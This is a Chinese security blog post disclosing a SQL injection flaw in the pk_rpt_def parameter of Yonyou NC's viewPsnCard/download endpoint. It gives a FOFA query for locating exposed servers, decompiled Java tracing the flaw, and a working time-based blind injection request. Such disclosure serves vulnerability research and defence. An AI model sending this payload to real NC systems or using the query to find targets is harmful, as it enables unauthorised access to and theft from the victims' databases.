---
title: "用友NC viewPsnCard/download sql注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-viewPsnCard-download-pk_rpt_def-sqli.html
asset_dir: assets/用友nc-viewpsncarddownload-sql注入漏洞
---

# 用友NC viewPsnCard/download sql注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/4/4 08:35
* 1332浏览
* [0评论](#comment)
* 32分钟阅读

深入探索

SQL

服务器

软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友")NC系统可利用/portal/pt/viewPsnCard/download接口中的 pk\_rpt\_def 参数实现sql注入，从而窃取服务器的敏感信息。

编程

# 影响版本

NC65

# fofa语法

> `app="用友-UFIDA-NC"`

# 漏洞分析

nc/bs/hrss/pub/action/PsnCardAction.class

深入探索

云安全解决方案

漏洞预警服务

JSON处理工具

```
package nc.bs.hrss.pub.action;

import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.URLEncoder;
import nc.bs.framework.common.NCLocator;
import nc.bs.logging.Logger;
import nc.bs.ml.NCLangResOnserver;
import nc.itf.hi.IRptQueryService;
import nc.itf.hr.tools.rtf.IGenerateRTFDocument;
import nc.uap.lfw.core.exception.LfwRuntimeException;
import nc.uap.lfw.servletplus.annotation.Action;
import nc.uap.lfw.servletplus.annotation.Servlet;
import nc.uap.lfw.servletplus.core.impl.BaseAction;
import nc.vo.hi.repdef.RepDefVO;
import nc.vo.ml.NCLangRes4VoTransl;
import nc.vo.pub.BusinessException;
import nc.vo.uif2.LoginContext;
import org.apache.commons.io.IOUtils;
import uap.lfw.core.ml.LfwResBundle;

@Servlet(
    path = "/viewPsnCard"
)
public class PsnCardAction extends BaseAction {
    public PsnCardAction() {
    }

    @Action
    public void download() {
        OutputStream out = null;

        try {
            this.request.setCharacterEncoding("UTF-8");
            String pk_rpt_def = this.request.getParameter("pk_rpt_def");
            String pk_psnjob = this.request.getParameter("pk_psnjob");
            RepDefVO repDefVO = ((IRptQueryService)NCLocator.getInstance().lookup(IRptQueryService.class)).queryByPk(pk_rpt_def);
            FileInputStream finput = null;
```

深入探索

sql

Web安全课程

VPN服务

`pk_rpt_def` 带入 queryByPk 函数

代码安全审计

```
public RepDefVO queryByPk(String pk) throws BusinessException {
        return (RepDefVO)(new BaseDAO()).retrieveByPK(RepDefVO.class, pk);
    }
public Object retrieveByPK(Class className, String pk) throws DAOException {
        PersistenceManager manager = null;
        Object values = null;

        try {
            manager = this.createPersistenceManager(this.dataSource);
            values = manager.retrieveByPK(className, pk);

public Object retrieveByPK(Class className, String pk, String[] selectedFields) throws DbException {
        SuperVO vo = this.initSuperVOClass(className);
        if (pk == null) {
            throw new IllegalArgumentException("pk is null");
        } else {
            SQLParameter param = new SQLParameter();
            param.addParam(pk.trim());
            List results = (List)this.retrieveByClause(className, vo.getPKFieldName() + "=?", selectedFields, param);
            return results.size() >= 1 ? results.get(0) : null;
        }
    }

public Collection retrieveByClause(Class className, String condition, String[] fields, SQLParameter parameters) throws DbException {
        BaseProcessor processor = new BeanListProcessor(className);
        return (Collection)this.session.executeQuery(this.buildSql(className, condition, fields), parameters, processor);
    }
```

最终调用 executeQuery 执行拼接的SQL语句，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞。

# 漏洞复现

漏洞利用示例

漏洞扫描服务

```
GET /portal/pt/viewPsnCard/download?pageId=login&pk_rpt_def=1'+and+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)--&pk_psnjob=1 HTTP/1.1
HTTP/1.1
Host: nc.mrxn.net
```

[![用友NC viewPsnCard/download sql注入漏洞](images/img-001-bf2694abcfde.webp)](https://image.mrxn.net/5f1a7c1a7f7b4818bea18fd6ee50226f.webp)

成功延时 5 秒

这个洞和前面 [用友NC rmwebImage/download sql注入漏洞](https://mrxn.net/jswz/yonyou-nc-rmwebImage-download-pk_psndoc-sqli.html) 和 [用友NC rmImage/download sql注入漏洞](https://mrxn.net/jswz/yonyou-nc-rmImage-download-pk_psndoc-sqli.html) 两个洞差不多，只不过这个也是未公开的漏洞。

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友NC viewPsnCard/download sql注入漏洞](https://mrxn.net/jswz/yonyou-nc-viewPsnCard-download-pk_rpt_def-sqli.html)  
文章链接：<https://mrxn.net/jswz/yonyou-nc-viewPsnCard-download-pk_rpt_def-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-viewPsnCard-download-pk\_rpt\_def-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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